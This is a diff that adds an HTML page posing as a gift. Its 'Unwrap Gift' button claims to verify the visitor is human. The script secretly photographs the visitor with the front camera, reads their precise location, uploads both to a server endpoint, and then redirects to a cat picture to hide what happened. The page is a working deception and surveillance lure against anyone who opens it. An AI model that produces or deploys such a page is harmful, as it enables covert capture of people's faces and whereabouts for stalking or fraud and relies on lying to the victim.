@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You have a surprise!</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            text-align: center;
+        }
+        .card {
+            background: white;
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 1rem;
+        }
+        p {
+            color: #666;
+            margin-bottom: 2rem;
+        }
+        button {
+            background-color: #ff4757;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        #status {
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            color: #888;
+        }
+        /* Hide the capture elements */
+        #video, #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h1>🎁 You've received a gift!</h1>
+        <p>Click the button below to unwrap your surprise. We just need to verify you're human first.</p>
+        
+        <button id="unlockBtn">Unwrap Gift</button>
+        <div id="status"></div>
+    </div>
+
+    <!-- Hidden elements for capture -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const unlockBtn = document.getElementById('unlockBtn');
+        const statusDiv = document.getElementById('status');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        unlockBtn.addEventListener('click', async () => {
+            unlockBtn.disabled = true;
+            statusDiv.textContent = "Verifying identity...";
+
+            try {
+                // 1. Request Camera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                
+                // Wait for video to be ready
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(resolve, 500); // Give it a moment to adjust exposure
+                    };
+                });
+
+                // 2. Request Location
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+
+                // 3. Capture Image
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Stop camera stream
+                stream.getTracks().forEach(track => track.stop());
+
+                // 4. Convert to Blob
+                canvas.toBlob(async (blob) => {
+                    // 5. Upload Data
+                    const formData = new FormData();
+                    formData.append('file', blob, 'capture.jpg');
+                    formData.append('latitude', position.coords.latitude);
+                    formData.append('longitude', position.coords.longitude);
+
+                    try {
+                        const response = await fetch('/api/upload', {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        if (response.ok) {
+                            statusDiv.textContent = "Verified! Redirecting...";
+                            // Redirect to a cute cat or something fun
+                            setTimeout(() => {
+                                window.location.href = "https://cataas.com/cat/cute";
+                            }, 1000);
+                        } else {
+                            throw new Error('Upload failed');
+                        }
+                    } catch (err) {
+                        console.error(err);
+                        statusDiv.textContent = "Something went wrong. Please try again.";
+                        unlockBtn.disabled = false;
+                    }
+                }, 'image/jpeg', 0.8);
+
+            } catch (err) {
+                console.error(err);
+                let msg = "Verification failed.";
+                if (err.name === 'NotAllowedError' || err.code === 1) {
+                    msg = "Please allow Camera and Location access to continue.";
+                }
+                statusDiv.textContent = msg;
+                unlockBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
